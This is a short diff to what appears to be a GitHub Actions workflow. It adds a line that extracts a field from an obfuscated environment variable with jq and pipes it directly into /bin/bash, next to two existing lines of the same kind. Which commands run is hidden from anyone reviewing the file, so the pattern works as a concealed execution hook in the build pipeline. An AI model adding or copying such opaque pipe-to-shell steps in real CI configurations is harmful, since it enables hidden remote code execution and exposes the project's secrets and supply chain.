@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$ixsx392" | jq -r .tr3 | /bin/bash
           printf '%s' "$ywxll73034" | jq -r .vwpmd1175 | /bin/bash
+          echo $idimd26 | jq -r .zpt1257 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
